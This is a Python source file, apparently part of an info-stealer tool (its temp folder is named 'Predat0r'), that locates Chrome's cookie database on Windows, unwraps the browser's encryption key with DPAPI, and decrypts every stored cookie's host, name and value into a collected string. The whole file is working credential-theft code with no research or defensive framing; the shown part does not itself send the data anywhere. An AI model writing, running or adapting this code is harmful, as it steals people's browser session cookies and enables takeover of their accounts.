import base64
import json
import os
import shutil
import sqlite3
import win32crypt
from Crypto.Cipher import AES

APP_DATA = os.environ["LOCALAPPDATA"]

class Cookies(object):
    def __init__(self):
        self.stored = ""
        self.lad = os.environ["LOCALAPPDATA"]
        self.temp = os.environ["APPDATA"] + "Predat0r"

    def chrome_key(self):
        with open(os.path.join(self.lad, "Google\\Chrome\\User Data\\Local State"), encoding="utf-8") as k:
            ck = json.loads(k.read())
        return win32crypt.CryptUnprotectData(
            base64.b64decode(ck["os_crypt"]["encrypted_key"])[5:],
            None,
            None,
            None,
            0)[1]

    def locate_db(self):
        full_path = os.path.join(APP_DATA, "Google\\Chrome\\User Data\\Default\\Cookies")
        temp_path = os.path.join(APP_DATA,"sqlite_file")
        if os.path.exists(full_path): 
            os.remove(temp_path)
        shutil.copyfile(full_path, temp_path)
        return full_path

    def decrypt_pass(self, cont):
        try:
            iv = cont[3:15]
            data = cont[15:]
            ciph = AES.new(self.chrome_key(), AES.MODE_GCM, iv)

            decrypted = ciph.decrypt(data)
            decrypted = decrypted[:-16].decode()
            return decrypted
        except Exception as e:
            data = win32crypt.CryptUnprotectData(
                    cont,
                    None,
                    None,
                    None,
                    0)
            return data

    def dump(self):
        try:
            db = self.locate_db()
            db2 = shutil.copy(db, APP_DATA)
            conn = sqlite3.connect(db2)
            cursor = conn.cursor()
            cursor.execute("SELECT host_key, name, encrypted_value from cookies")
            for item in cursor.fetchall():
                if item[0] != "":
                    self.stored += f"HOST: {item[0]}\nNAME: {item[1]}\nCOOKIE: {self.decrypt_pass(item[2])}\n\n"
        except Exception as e:
            pass
        return self.stored